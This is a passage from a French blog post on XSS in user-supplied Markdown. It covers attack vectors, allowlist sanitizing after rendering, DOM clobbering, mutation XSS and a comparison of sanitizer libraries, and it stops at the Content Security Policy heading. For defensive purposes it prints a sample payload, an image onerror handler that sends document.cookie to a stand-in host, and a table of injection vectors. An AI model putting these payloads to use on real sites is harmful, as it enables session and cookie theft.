---
title: "XSS en Markdown : Markdown autorise le HTML brut, donc il autorise les scripts"
description: "Markdown laisse passer le HTML brut : un fichier .md peut donc porter des scripts. Les vecteurs, liste blanche contre liste noire, et ce qu’ajoute une CSP"
date: 2026-08-21
tag: Sécurité
keywords: xss markdown, assainir du markdown, nettoyer du html, dompurify, html brut dans markdown, afficher du markdown sans risque, markdown écrit par les utilisateurs, éviter le xss en html, content security policy
---

Markdown a été conçu pour côtoyer le HTML, non pour le remplacer. Les règles de syntaxe d’origine laissent passer le HTML sans y toucher, et les analyseurs qui les suivent font encore de même aujourd’hui. Donnez une balise `<script>` à `marked` ou à Python-Markdown et vous récupérez une balise `<script>` ; `markdown-it` et remark se comportent pareil dès que le HTML brut est activé.

### En bref

Markdown autorise le HTML brut à dessein : tout Markdown que vous n’avez pas écrit vous-même peut donc transporter `<script>`, `onerror=`, des URL `javascript:`, un `<iframe srcdoc>`, des actions de formulaire et des identifiants qui masquent vos propres variables globales. La solution est un **assainisseur à liste blanche appliqué au HTML rendu**, jamais à la source Markdown, parce que le moteur de rendu invente du balisage qui n’a jamais figuré littéralement dans le fichier. Utilisez DOMPurify dans un navigateur et, côté serveur, un assainisseur pour Node, Python, Go, Java, Rust ou Ruby réglé sur la *même* liste blanche, puis posez une Content Security Policy sur la page pour qu’un défaut de l’assainisseur se solde par une requête bloquée plutôt que par une session volée.

Personne ne décide un beau matin de rendre du Markdown venu d’ailleurs. Cela arrive de biais. Une zone de commentaires se dote d’un volet d’aperçu, un support client se met à accepter des tickets mis en forme, un script de build rend sur un tableau de bord interne tous les README d’un monorepo, la sortie d’un modèle atterrit directement dans une page pour qu’on puisse la lire correctement. Dans chacun de ces cas, une chaîne de caractères contrôlée par quelqu’un d’autre se retrouve dans un document qui partage une fenêtre avec votre propre JavaScript.

Pour un fichier issu de votre propre dépôt, c’est le comportement attendu. Pour un commentaire, un ticket ou la sortie d’un modèle de langue, c’est une brèche : il faut que quelque chose se tienne entre l’analyseur et la page.

Le mot « assainir » masque la quantité de décisions en jeu. Un assainisseur n’est pas un filtre que l’on enclenche. C’est une déclaration écrite des balises et des attributs que votre produit accepte, appliquée en un point précis de la chaîne, dans un environnement dont l’analyseur HTML correspond à celui que le lecteur utilisera. Rédigez mal la déclaration et elle n’est que décorative ; placez-la au mauvais endroit et c’est pire que décoratif, car tout ce qui vient ensuite a l’air sûr.

## Le HTML brut dans Markdown est une fonctionnalité, pas un oubli

Le postulat de Markdown était que sa syntaxe ne couvrirait jamais tout, et que ce qu’elle ne couvrait pas, vous l’écririez en HTML. C’est ce postulat qui a fait la diffusion du format et qui en fait encore le plus court chemin entre du texte et une page. C’est aussi pourquoi tout moteur de rendu conforme est, par contrat, un tuyau à HTML.

Une charge malveillante n’a pas besoin d’en avoir l’air. Ceci est du Markdown parfaitement valide :

```markdown
Thanks for the fix, this works now.

<img src=x onerror="fetch('https://elsewhere.invalid/?c='+document.cookie)">
```

L’analyseur reconnaît un fragment de HTML et le recopie en sortie. Rien n’est malformé, donc rien ne vous alerte. Pas d’erreur, pas de ligne de journal, aucun artefact visible dans la page rendue — une image cassée est précisément la chose que tous les lecteurs ont appris à ignorer.

Les analyseurs ont essayé d’aider, autrefois. `marked` avait une option `sanitize` ; elle a été dépréciée, puis retirée, la documentation renvoyant vers un assainisseur dédié. C’était le bon choix. Un filtre HTML écrit à moitié à l’intérieur d’un analyseur Markdown est pire que rien, parce qu’il se lit comme une protection : un relecteur aperçoit `sanitize: true` dans un objet d’options et cesse de poser des questions. Assainir du HTML correctement suppose d’assumer un analyseur, un sérialiseur, une liste blanche et un processus de réponse aux failles, et une bibliothèque Markdown n’a aucune raison d’en promettre trois sur quatre.

La solution la plus simple, quand elle convient : `markdown-it` laisse le HTML brut désactivé par défaut, les chevrons ressortent donc échappés et visibles. Si vos utilisateurs n’ont aucune raison d’écrire du HTML, laissez l’option désactivée — moins de code et moins de bogues que n’importe quelle liste blanche. [Python-Markdown](/blog/markdown-to-html-in-python) n’a pas d’interrupteur équivalent et sa documentation vous oriente vers un assainisseur séparé : une chaîne Python comporte donc toujours une seconde étape, que quelqu’un l’ait écrite ou non.

Désactiver le HTML brut est la seule option de cette page qui supprime la surface d’attaque au lieu de la filtrer. Tout le reste relève d’un jugement sur le HTML que vous acceptez de faire tourner.

## Les vecteurs, nommés

La liste ci-dessous n’est pas un catalogue d’astuces exotiques. C’est la surface ordinaire du HTML, un langage fait pour bâtir des applications, à qui l’on confie un document écrit par un inconnu.

| Ce qui arrive | Ce que cela fait | La règle |
| --- | --- | --- |
| `<script>alert(1)</script>` | S’exécute si le HTML est analysé plutôt qu’affecté par un point d’insertion sûr | N’autorisez jamais `script` ; n’autorisez pas non plus `noscript` |
| `<img src=x onerror=...>` | Se déclenche à l’échec du chargement de l’image, qui échouera | Supprimez tout attribut dont le nom commence par `on` |
| `<a href="javascript:...">` | S’exécute au clic, sans la moindre balise de script | N’autorisez que `http`, `https`, `mailto` et le relatif |
| `<a href="data:text/html,...">` | Un document entier dans une URL | Écartez complètement `data:` de `href` |
| `<iframe srcdoc="...">` | Transporte un document dans un attribut, dans votre origine | Supprimez `iframe`, `object`, `embed` |
| `<form action="https://elsewhere">` | Fait de vos champs le formulaire de quelqu’un d’autre | Supprimez `form`, `button`, `input`, `formaction` |
| `<style>` et `style="..."` | Repositionne, recouvre, dissimule, et fuite par `url()` | Supprimez les deux, sauf raison précise |
| `<a id="config">` | Masque `window.config` sans exécuter le moindre code | Préfixez chaque `id` et chaque `name` conservé |
| `<base href="//elsewhere">` | Réoriente toutes les URL relatives de la page | Supprimez-la ; posez `base-uri 'none'` |
| `<meta http-equiv="refresh">` | Emmène le lecteur ailleurs | Supprimez `meta` |
| `<svg>`, `<math>`, `<template>` | Règles d’analyse différentes, donc bogues différents | Supprimez-les, sauf si la liste blanche en a besoin |

**Les attributs gestionnaires d’événements sont le vrai sujet.** `<script>` est le vecteur que tout le monde bloque en premier et celui qui compte le moins, parce que les charges intéressantes s’en passent. Chaque attribut `on*` est un script en ligne écrit autrement, et la spécification continue d’allonger la liste. C’est l’argument le plus net en faveur d’une liste blanche d’attributs plutôt que d’une énumération de ceux qui vous déplaisent : vous ne pouvez pas énumérer `on*` correctement, et vous n’avez pas à le faire.

**Les schémas d’URL demandent à être décodés avant d’être vérifiés.** Testez la valeur décodée, pas la chaîne brute. `java&#9;script:`, `JaVaScRiPt:` et une URL précédée d’un saut de ligne ne font qu’une seule URL pour un navigateur et plusieurs chaînes distinctes pour une comparaison naïve. Écartez `data:` de `href` par principe : les navigateurs bloquent bien une navigation de premier niveau vers `data:text/html`, mais c’est leur parade, pas la vôtre, et elle ne couvre pas tous les points d’insertion.

**`srcdoc` est l’attribut que l’on oublie.** Un `<iframe srcdoc>` transporte un document HTML complet dans une valeur d’attribut, doublement échappé, et hérite de l’origine du document qui l’intègre. Un assainisseur qui autorise `iframe` pour les intégrations vidéo et oublie `srcdoc` a laissé passer du HTML arbitraire de même origine par un trou en forme de lecteur vidéo.

**Les actions de formulaire volent sans le moindre script.** Un `<form action="https://elsewhere.invalid">` injecté autour d’une partie de votre page transforme le prochain clic du lecteur en un envoi ailleurs, et un `<input type="image" formaction="...">` écrase l’action d’un formulaire que vous avez écrit. Rien ne s’exécute ; le navigateur fait exactement ce que le balisage lui dit. Voilà pourquoi `form` et `input` méritent de la vigilance même lorsque vous autorisez `<input type="checkbox" disabled>` pour les listes de tâches du GFM — autorisez la seule combinaison d’attributs dont vous avez besoin, et rien d’autre.

**Le CSS est un pouvoir, pas un ornement.** La syntaxe `expression()`, qui rendait jadis `style` directement exécutable, a disparu des navigateurs actuels depuis longtemps, et c’est encore elle qui vaut au CSS sa réputation ici. Les vrais problèmes sont plus discrets. `position: fixed` avec un `z-index` élevé pose l’élément d’un attaquant par-dessus votre interface, si bien qu’un clic sur « Annuler » atterrit ailleurs. `opacity: 0` masque un texte qui reste sélectionnable. Un `url()` dans un arrière-plan atteint un tiers au moment même où l’élément est rendu : c’est une balise-espion qui indique à quelqu’un quand votre document a été lu. Rien de tout cela n’exécute de script et tout cela pose problème, ce qui explique que la réponse par défaut pour `<style>` et `style` soit non.

## Le DOM clobbering : un identifiant qui masque une propriété

Tout élément muni d’un `id` devient une propriété de `window` portant ce nom, et les champs de formulaire nommés deviennent des propriétés de leur formulaire. Un `<a id="config">` injecté fait de `window.config` un élément d’ancrage : `if (!window.config) { window.config = defaults }` prend donc la mauvaise branche, et `config.apiBase` vaut désormais `undefined` au lieu de votre URL — ou bien, avec `<a id="config" name="apiBase" href="//elsewhere">`, une valeur choisie par un attaquant. Aucun script n’a tourné. Un attribut a suffi.

Les assainisseurs couvrent cela moins largement que leur réputation ne le laisse croire. La protection par défaut de DOMPurify contre le DOM clobbering ne supprime un `id` ou un `name` que lorsque la valeur est déjà une propriété d’un `Document` ou d’un `HTMLFormElement` : `id="title"`, `id="body"`, `id="cookie"` et `id="action"` disparaissent, `id="config"` reste. `config` est un nom inventé par votre propre code, et aucun assainisseur ne va lire vos variables globales. La couverture plus complète s’appelle `SANITIZE_NAMED_PROPS`, désactivée par défaut, qui préfixe par `user-content-` chaque `id` et chaque `name` qu’elle conserve.

Ce préfixe est la véritable défense — un identifiant qui ne peut pas entrer en collision ne peut rien masquer — et il doit couvrir à la fois les identifiants qui arrivent dans le document et ceux que votre moteur de rendu fabrique à partir des titres, puisqu’un titre intitulé « Config » produit `id="config"` sans le moindre attaquant. Ce site assainit avec DOMPurify dans le navigateur et le paquet `xss` sur le serveur, contre une liste blanche unique et partagée, et préfixe chaque identifiant de titre par `doc-` : la même défense, appliquée à la main. Si vous engendrez des ancres pour un sommaire, c’est l’étape à ajouter aujourd’hui, avant tout le reste de cette page.

## La liste blanche l’emporte sur la liste noire

Une liste noire nomme ce qui est interdit et échoue la première fois que quelqu’un emploie une balise à laquelle personne n’avait pensé. Elle échoue de nouveau chaque fois qu’un navigateur livre une nouveauté, et une troisième fois sur une question de casse, d’encodage, ou d’un attribut dont l’auteur de la liste n’avait jamais entendu parler. Une liste blanche nomme ce qu’un document a le droit de contenir et supprime le reste : son mode de défaillance est un élément `<details>` manquant, pas une session volée.

La liste blanche reste courte, parce que la sortie de Markdown est modeste : titres, paragraphes, listes, citations, tableaux, code, emphase, liens, images, filets horizontaux, et un `<input>` pour les listes de tâches. La liste d’attributs est plus courte encore — `href`, `src`, `alt`, `title`, `class` si vous habillez les blocs de code, `colspan` et `rowspan` si vos tableaux en ont besoin, `type`, `checked` et `disabled` pour les listes de tâches.

Écrivez cette liste dans un seul fichier et importez-la partout. L’échec le plus fréquent sur le terrain n’est pas un contournement, c’est une dérive : l’assainisseur du navigateur et celui du serveur ont été configurés séparément, à six mois d’intervalle, par deux personnes, et le document qui s’affiche sans danger dans l’application est stocké avec son `<iframe>` intact, à l’intention du prochain consommateur. Deux listes blanches font une liste blanche et un passif.

L’autre règle, c’est que la liste blanche appartient au produit, pas à la bibliothèque. Le `defaultSchema` de `rehype-sanitize` suit les règles d’assainissement de GitHub, et `UGCPolicy()` de bluemonday est une valeur par défaut mûrement réfléchie pour du contenu d’utilisateurs — deux points de départ meilleurs que tout ce que vous écrirez en un après-midi. Ni l’un ni l’autre ne sait si votre page contient un `<div id="app">` que votre cadriciel consulte. Partez de la politique fournie, puis retranchez.

## Assainir après le rendu, jamais avant

Assainir la source Markdown revient à deviner ce que l’analyseur en fera, et l’analyseur vous surprendra. Markdown offre plusieurs orthographes pour une même sortie — liens de référence, échappements par barre oblique inverse, entités de caractères, blocs HTML indentés — si bien qu’un filtre qui cherche `javascript:` dans la source rate `[click](java&#115;cript:alert(1))` ainsi qu’une définition de référence posée trois cents lignes sous le lien qui l’utilise. Pire : le moteur de rendu invente du balisage qui n’a jamais figuré littéralement dans le fichier. Un lien automatique devient un `<a href>` complet que la source ne contenait pas, un bloc encadré devient `<pre><code class="language-...">`, un titre devient un `id`. Un filtre posé sur la source filtre la mauvaise chaîne.

Assainissez donc ce que le moteur de rendu a produit, puis cessez d’y toucher :

```js
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const clean = DOMPurify.sanitize(marked.parse(userMarkdown), {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  SANITIZE_NAMED_PROPS: true,
});
```

« Puis cessez d’y toucher » est la moitié que l’on saute. Un coloriseur syntaxique qui enveloppe les jetons dans des `span`, un gabarit qui interpole la chaîne dans une enveloppe, une expression régulière qui réécrit les ancres pour y ajouter `target="_blank"`, une étape qui injecte des ancres de titres pour un sommaire : chacune tourne après l’assainisseur et se place hors de sa garantie. Si une transformation est indispensable, ou bien exécutez-la avant l’assainisseur pour que sa sortie soit vérifiée elle aussi, ou bien appliquez-la au DOM après insertion à l’aide de `textContent` et de `setAttribute` plutôt qu’en modifiant une chaîne.

Une dernière règle de placement : stockez le Markdown *d’origine*, pas le HTML assaini. Assainir à l’entrée puis faire confiance au stockage fige votre liste blanche à la date de l’écriture ; le jour où vous la resserrez, tous les anciens documents restent tels quels.

## Le XSS par mutation : deux analyseurs en désaccord

Un assainisseur analyse le HTML en un arbre, juge cet arbre propre, et le sérialise de nouveau en chaîne. Le navigateur analyse ensuite cette chaîne une seconde fois. Si la seconde analyse produit un arbre différent de la première, la vérification a porté sur un document que personne ne livre. C’est le XSS par mutation, et le bogue n’appartient à aucun des deux analyseurs — seulement à leur désaccord.

Les endroits à surveiller sont ceux où les règles d’analyse du HTML changent en cours de document. Le contenu étranger, comme `<svg>` et `<math>`, suit des règles proches du XML, dans lesquelles `<style>` et les commentaires se comportent autrement. `<template>` possède son propre document de contenu. Une imbrication qui force une balise fermante implicite peut déplacer un élément hors du sous-arbre dans lequel il avait été vérifié. Les entités à l’intérieur des valeurs d’attribut se décodent à une autre étape que celles du texte.

Les défenses sont ennuyeuses, et c’est bien tout l’intérêt. Maintenez l’assainisseur à jour, car cette classe de bogues est trouvée par des chercheurs et corrigée dans des versions : une version figée depuis trois ans est le risque réel. N’enchaînez jamais deux assainisseurs, puisque c’est la sortie du dernier qui part en production et que la garantie du premier est nulle. Tenez le contenu étranger hors de la liste blanche, sauf exigence formelle.

L’assainissement côté serveur souffre ici d’une faille structurelle : privé de navigateur, il apporte son propre analyseur, qui n’est pas celui de votre lecteur. La réponse d’Ammonia s’appelle html5ever, qui analyse et sérialise les fragments à la manière des navigateurs ; celle de sanitize-html s’appelle htmlparser2, choisi pour sa rapidité et sa tolérance. Tolérance et fidélité ne sont pas la même propriété. Simuler un DOM est pire que l’un et l’autre : placé dans un environnement inutilisable, DOMPurify renvoie son entrée inchangée au lieu de lever une exception, et une configuration jsdom cassée échoue donc en grand ouvert, et en silence.

## Comparatif rapide : l’aide-mémoire

| Outil | Idéal pour | Capacité clé | Prix |
| --- | --- | --- | --- |
| Aucun HTML brut du tout | Commentaires, messagerie, tout ce qui n’a jamais eu besoin de HTML | `markdown-it` échappe le HTML brut par défaut | Gratuit, MIT |
| DOMPurify (navigateur) | Rendre dans une page du Markdown venu d’ailleurs | Emploie l’analyseur du navigateur lui-même, donc pas de second avis | Gratuit, Apache 2.0 ou MPL 2.0 |
| DOMPurify + jsdom | Réutiliser une liste blanche unique sur un serveur Node | Le même objet de configuration, un DOM synthétique | Gratuit, Apache 2.0 ou MPL 2.0 ; jsdom MIT |
| sanitize-html | Node sans DOM | htmlparser2, listes blanches d’attributs par élément | Gratuit, MIT |
| js-xss (`xss`) | Node, navigateurs, et une ligne de commande | Option `whiteList`, aucun DOM requis, muni d’une interface en ligne de commande | Gratuit, MIT |
| rehype-sanitize | Les chaînes remark et unified | Assainit l’arbre hast, pas une chaîne | Gratuit, MIT |
| nh3 | Python | Liaisons vers ammonia, écrit en Rust | Gratuit, MIT |
| Bleach | Rien de neuf | Fut la valeur par défaut en Python ; désormais sans maintenance | Gratuit, Apache 2.0 |
| bluemonday | Go | Préréglages `UGCPolicy()` et `StrictPolicy()` | Gratuit, BSD-3-Clause |
| OWASP Java HTML Sanitizer | Java | `HtmlPolicyBuilder`, sans dépendance à l’exécution | Gratuit, Apache 2.0 ou BSD-2-Clause |
| Ammonia | Rust | html5ever, analyse comme un navigateur | Gratuit, MIT ou Apache 2.0 |
| Loofah | Ruby | Nettoyeurs Nokogiri ; l’assainisseur de Rails est bâti dessus | Gratuit, MIT |
| Content Security Policy | Le défaut d’assainisseur que vous n’avez pas trouvé | Bloque l’exécution quel que soit le balisage | Gratuit, un standard du web |
| Iframe en bac à sable | Les documents que vous ne pouvez pas rendre sûrs | `sandbox` retire l’origine, les scripts et les formulaires | Gratuit, partie du HTML |
| TransformPipe | Convertir un fichier `.md` que vous n’avez pas écrit | Assainit dans le navigateur et sur le serveur, une seule liste blanche | Gratuit |

## Les options, une par une

### Aucun HTML brut du tout — l’option à laquelle personne ne pense en premier

Avant de choisir un assainisseur, demandez-vous si la fonctionnalité doit exister. Si vos utilisateurs écrivent des commentaires, des messages ou des corps de tickets, presque aucun d’eux ne souhaite écrire du HTML, et ceux qui le souhaitent sont la raison pour laquelle vous lisez ceci. `markdown-it` est livré avec `html: false`, qui échappe les chevrons de sorte qu’ils s’affichent comme du texte visible.

| Avantages | Inconvénients |
| --- | --- |
| Supprime la surface d’attaque au lieu de la filtrer | Tout ce que Markdown ne sait pas exprimer devient impossible |
| Aucune liste blanche à entretenir, aucun assainisseur à maintenir à jour | Des documents écrits ailleurs peuvent déjà contenir du HTML |
| Pas de XSS par mutation, puisque rien n’est réanalysé | Les utilisateurs qui ont besoin d’un bloc `<details>` se plaindront |

**Prix :** gratuit, sous licence MIT.

**Détails techniques et fonctions**

- `markdown-it` vaut `html: false` par défaut ; le HTML brut de la source est échappé, pas analysé
- `marked` et Python-Markdown laissent passer le HTML brut et attendent un assainisseur séparé
- Échapper n’est pas assainir : cela produit du texte, et c’est pour cela qu’on ne peut pas le contourner

**Pour qui ?** Pour quiconque rend de courts textes écrits par des utilisateurs. C’est le bon comportement par défaut pour une zone de commentaires, et il est retenu bien plus rarement qu’il ne le devrait.

### DOMPurify dans le navigateur — la réponse par défaut

DOMPurify assainit une chaîne HTML en s’appuyant sur le DOM de l’environnement où il s’exécute. Dans un navigateur, c’est le même analyseur que celui qui affichera le résultat, ce qui élimine la faille du XSS par mutation à sa racine : il n’y a pas de second avis, parce qu’il n’y a qu’un analyseur.

| Avantages | Inconvénients |
| --- | --- |
| Emploie l’analyseur du navigateur : l’arbre vérifié est l’arbre rendu | Exige un DOM, donc Node seul réclame jsdom |
| Activement maintenu, avec un vrai historique de réponse aux failles | `SANITIZE_NAMED_PROPS` est désactivé par défaut : le clobbering n’est donc couvert qu’en partie |
| La configuration tient dans un objet d’options partageable dans toute une base de code | Renvoie son entrée inchangée si le DOM fourni est inutilisable, échec en grand ouvert |
| Des crochets permettent d’inspecter et de rejeter des nœuds pendant l’assainissement | Les listes blanches par défaut sont larges ; la plupart des produits devraient en retrancher |

**Prix :** gratuit, sous double licence Apache 2.0 ou MPL 2.0.

**Détails techniques et fonctions**

- `ALLOWED_TAGS` et `ALLOWED_ATTR` pour une liste blanche partie de zéro ; `ADD_TAGS` et `ADD_ATTR` pour étendre les valeurs par défaut
- `USE_PROFILES` restreint aux ensembles HTML, SVG ou MathML plutôt qu’aux trois à la fois
- `FORBID_TAGS` et `FORBID_ATTR` pour retrancher aux valeurs par défaut
- `SANITIZE_NAMED_PROPS` préfixe les valeurs `id` et `name` conservées, ce qui est le correctif du DOM clobbering
- `ALLOW_DATA_ATTR` et `ALLOW_ARIA_ATTR` commandent les deux grandes familles d’attributs

**Pour qui ?** Pour quiconque rend du Markdown dans une page, dans un navigateur. [Le pas-à-pas en JavaScript](/blog/markdown-to-html-in-javascript) explique comment câbler `marked` et DOMPurify dans le bon ordre.

### DOMPurify avec jsdom — la même liste blanche sur un serveur

DOMPurify tourne aussi sous Node, contre une fenêtre jsdom. La raison de procéder ainsi n’est pas qu’il s’agit du meilleur assainisseur côté serveur : c’est qu’il s’agit du *même* assainisseur, réglé par le même objet, si bien que le navigateur et le serveur ne peuvent pas diverger.

| Avantages | Inconvénients |
| --- | --- |
| Une liste blanche, une configuration, deux environnements d’exécution | jsdom est une grosse dépendance pour une seule tâche |
| Le comportement colle de près à celui du navigateur | jsdom n’est pas un navigateur : l’écart entre analyseurs revient |
| Une API familière si votre front-end l’utilise déjà | Une fenêtre mal configurée en fait une opération vide, sans erreur |

**Prix :** gratuit ; DOMPurify sous Apache 2.0 ou MPL 2.0, jsdom sous MIT.

**Détails techniques et fonctions**

- Instanciez avec `createDOMPurify(new JSDOM('').window)` et réutilisez l’instance
- Importez la liste blanche depuis un module partagé, pour qu’elle ne puisse pas être modifiée d’un seul côté
- Vérifiez par des tests qu’une balise `<script>` est bien retirée dans la configuration déployée

**Pour qui ?** Pour les services Node qui rendent déjà du Markdown côté client et veulent une seule définition de « sûr » plutôt que deux.

### sanitize-html — un assainisseur Node doté de son propre analyseur

sanitize-html nettoie le HTML avec des listes blanches d’attributs par élément, bâties sur htmlparser2 plutôt que sur un DOM. La forme de ses options épouse joliment la façon dont se lit réellement une liste blanche pour Markdown : cette balise peut porter ces attributs, et aucun autre.

| Avantages | Inconvénients |
| --- | --- |
| Ni DOM ni jsdom : il est léger dans un processus serveur | Son analyseur n’est pas celui du navigateur, d’où l’écart propice au mXSS |
| Les listes blanches d’attributs sont par élément, ce qui est la bonne granularité | La configuration devient verbeuse pour une liste blanche large |
| `transformTags` réécrit les éléments au cours de la passe | Le dépôt autonome est archivé et en lecture seule, le développement ayant migré dans le monorepo d’ApostropheCMS (vérifié sur github.com/apostrophecms/sanitize-html, le 8 septembre 2026) |

**Prix :** gratuit, sous licence MIT.

**Détails techniques et fonctions**

- `allowedTags`, `allowedAttributes`, `allowedSchemes` et `transformTags` comme options principales
- Bâti sur htmlparser2, que le projet décrit comme choisi pour sa rapidité et sa tolérance
- Tourne partout où Node tourne, sans étape de compilation native

**Pour qui ?** Pour les services Node qui veulent une vraie liste blanche sans embarquer une implémentation du DOM, et pour les équipes qui trouvent sa configuration par élément plus facile à relire qu’une liste plate.

### js-xss — un assainisseur sans DOM et avec une ligne de commande

Le paquet `xss` assainit du HTML sous Node et dans les navigateurs, contre une option `whiteList`, sans avoir besoin d’un DOM. Il livre aussi une interface en ligne de commande, qui le rend utilisable dans un enchaînement shell autant que dans un service.

| Avantages | Inconvénients |
| --- | --- |
| Tourne sous Node et dans les navigateurs sans dépendre d’un DOM | Son propre analyseur, donc l’écart entre analyseurs s’applique |
| Une interface en ligne de commande : il s’insère dans un script de build sans écrire de code | Surface de configuration plus réduite que celle de DOMPurify |
| `whiteList` se projette directement sur des paires balise-attributs | `allowList` en est un alias : la documentation se lit donc de deux façons |

**Prix :** gratuit, sous licence MIT.

**Détails techniques et fonctions**

- `whiteList` (dont `allowList` est l’alias) définit les balises permises et leurs attributs
- Des gestionnaires personnalisés pour les valeurs d’attributs, utiles pour contrôler le schéma d’un `href`
- `xss -i <input> -o <output>` assainit un fichier depuis la ligne de commande

**Pour qui ?** Pour les services Node qui veulent une petite dépendance, et pour quiconque assainit un fichier en intégration continue sans navigateur. C’est la moitié serveur de la chaîne qui fait tourner ce site, associée à DOMPurify dans le navigateur contre une liste blanche unique et partagée.

### rehype-sanitize — assainir l’arbre, pas la chaîne

Si votre chaîne repose sur remark ou unified, rehype-sanitize assainit l’arbre hast au milieu du parcours. Rien n’est sérialisé, vérifié puis réanalysé, ce qui élimine toute une classe de bogues en supprimant l’étape où elle vit.

| Avantages | Inconvénients |
| --- | --- |
| Opère sur l’arbre : aucun aller-retour par une chaîne, donc rien à contredire | N’a de sens qu’à l’intérieur d’une chaîne unified |
| `defaultSchema` suit les règles d’assainissement de GitHub, un point de départ réfléchi | La chaîne unified demande un vrai apprentissage |
| Aucun DOM requis ; tourne sous Node, Deno et dans les navigateurs | Uniquement en ESM, et la syntaxe des schémas est une chose de plus à apprendre |

**Prix :** gratuit, sous licence MIT.

**Détails techniques et fonctions**

- Assainit hast, l’arbre syntaxique du HTML, entre `remark-rehype` et `rehype-stringify`
- `defaultSchema` est exporté et peut être étendu ou resserré
- Placez-le après tout module d’extension qui engendre du HTML, et avant la sérialisation

**Pour qui ?** Pour les équipes qui se servent déjà de remark ou d’unified pour transformer des documents plutôt que simplement les rendre. Un assainisseur placé dans la chaîne vaut mieux qu’un assainisseur boulonné sur la sortie.

### nh3 — la réponse pour Python

nh3 fournit des liaisons Python vers ammonia, l’assainisseur HTML écrit en Rust. Comme le travail se déroule dans une bibliothèque compilée qui emploie un analyseur de qualité navigateur, il est à la fois rapide et plus proche du comportement d’un navigateur qu’un filtre écrit en Python pur.

| Avantages | Inconvénients |
| --- | --- |
| Adossé à ammonia et à html5ever, qui analysent comme les navigateurs | Une dépendance compilée : les paquets binaires comptent en environnement contraint |
| Maintenu, et le remplaçant concret de Bleach | Une surface d’API plus réduite que celle de Bleach |
| Fondé sur une liste blanche, conformément au modèle que cet article défend | La configuration ne remplace pas celle de Bleach au pied levé |

**Prix :** gratuit, sous licence MIT.

**Pour qui ?** Pour les services Python qui assainissent une sortie Markdown, et pour quiconque importe encore Bleach.

### Bleach — celui qu’il faut quitter

Bleach a été l’assainisseur HTML par défaut en Python pendant des années, et bien des outils existants l’importent encore. Il n’est plus maintenu : le README annonce qu’il n’y aura plus de versions, pas même pour les failles de sécurité (vérifié sur github.com/mozilla/bleach, le 8 septembre 2026).

| Avantages | Inconvénients |
| --- | --- |
| Un vaste corpus de code et de documentation existants | Sans maintenance, et sans correctif de sécurité à venir |
| Une API de liste blanche familière | Un assainisseur non maintenu est la dépendance qu’on ne peut ni figer ni oublier |
| Toujours fonctionnel pour les cas qu’il traitait | La défense contre le mXSS dépend d’une maintenance continue, qui s’est arrêtée |

**Prix :** gratuit, sous licence Apache 2.0.

**Pour qui ?** Pour personne, s’agissant d’un travail neuf. S’il figure dans votre fichier de dépendances, c’est un ticket de migration, pas une note de bas de page — dans cette classe de bogues, « rester à jour » constitue l’essentiel de la défense.

### bluemonday — la réponse pour Go

bluemonday assainit le HTML en Go contre une politique que vous construisez, ou contre l’un de ses préréglages. Ses deux politiques nommées épousent proprement les deux situations que connaissent la plupart des produits.

| Avantages | Inconvénients |
| --- | --- |
| `UGCPolicy()` est un point de départ raisonnable pour du contenu d’utilisateurs | Go seulement |
| `StrictPolicy()` retire tout le balisage, pour les titres et les champs d’une ligne | Construire une politique, c’est du code : cela demande une relecture comme du code |
| Fondé sur une liste blanche par conception, avec des motifs regexp pour les valeurs d’attributs | Son propre analyseur, donc l’écart entre analyseurs s’applique |

**Prix :** gratuit, sous licence BSD-3-Clause.

**Détails techniques et fonctions**

- `UGCPolicy()` permet un large ensemble d’éléments de contenu d’utilisateurs et exclut les iframes, objets, embeds, styles et scripts
- `StrictPolicy()` retire tous les éléments et tous les attributs
- Les politiques se composent : vous pouvez donc partir d’un préréglage et retrancher

**Pour qui ?** Pour les services en Go qui rendent du Markdown venu d’utilisateurs. Commencez par `UGCPolicy()`, puis retirez ce dont votre produit n’a pas besoin.

### OWASP Java HTML Sanitizer — la réponse pour Java

Un assainisseur Java doté d’un constructeur de politique explicite et sans dépendance à l’exécution, maintenu sous l’égide de l’OWASP. L’API `HtmlPolicyBuilder` fait lire la liste blanche comme une spécification, ce qui est utile lorsque cette liste doit survivre à une revue de sécurité.

| Avantages | Inconvénients |
| --- | --- |
| `HtmlPolicyBuilder` produit une politique lisible et relisible | Java seulement |
| Aucune dépendance à l’exécution | Les politiques préemballées sont étroites : l’essentiel du travail vous revient |
| `Sanitizers.FORMATTING` et `Sanitizers.LINKS` préemballés, et combinables | Son propre analyseur, donc l’écart entre analyseurs s’applique |

**Prix :** gratuit, sous double licence Apache 2.0 ou BSD-2-Clause.

**Pour qui ?** Pour les services sur JVM. Son API de construction est l’expression la plus claire du principe de liste blanche dans tous les langages de cette liste, ce qui en fait une bonne chose à montrer à qui n’est pas encore convaincu.

### Ammonia — la réponse pour Rust, et l’argument de l’analyseur

Ammonia est un assainisseur HTML à liste blanche écrit en Rust et bâti sur html5ever. Son approche déclarée consiste à analyser et à sérialiser les fragments de document exactement comme le font les navigateurs, ce qui est la propriété la plus importante pour un assainisseur côté serveur.

| Avantages | Inconvénients |
| --- | --- |
| html5ever analyse comme les navigateurs, ce qui réduit l’écart entre analyseurs | Rust seulement, sauf à passer par des liaisons |
| Fondé sur une liste blanche, et rapide | Moins de politiques toutes prêtes que bluemonday |
| C’est aussi le moteur derrière nh3 pour Python | Une dépendance compilée dans des builds polyglottes |

**Prix :** gratuit, sous double licence MIT ou Apache 2.0.

**Pour qui ?** Pour les services en Rust et — via nh3 — pour ceux en Python. À lire également si vous choisissez un assainisseur côté serveur dans n’importe quel langage, car son choix d’analyseur est l’argument que vous devriez appliquer aux autres.

### Loofah — la réponse pour Ruby

Loofah récure le HTML à l’aide de Nokogiri, avec des nettoyeurs qui retirent, élaguent, échappent ou blanchissent le balisage. L’assainisseur HTML de Rails est bâti dessus : la plupart des applications Ruby s’en servent donc déjà indirectement.

| Avantages | Inconvénients |
| --- | --- |
| Bâti sur Nokogiri, un analyseur HTML longuement éprouvé | Ruby seulement |
| Déjà sous l’assainisseur de Rails : il est donc bien testé sur le terrain | Nokogiri est une dépendance native |
| Plusieurs stratégies de récurage, et non une seule | Le nom des stratégies demande un moment d’apprentissage |

**Prix :** gratuit, sous licence MIT.

**Pour qui ?** Pour les applications Ruby et Rails. Si vous appelez l’assistant `sanitize` de Rails, vous y êtes déjà ; la question est de savoir si la liste blanche est la vôtre ou celle du cadriciel par défaut.

### Content Security Policy — la couche qu’un assainisseur ne peut pas être

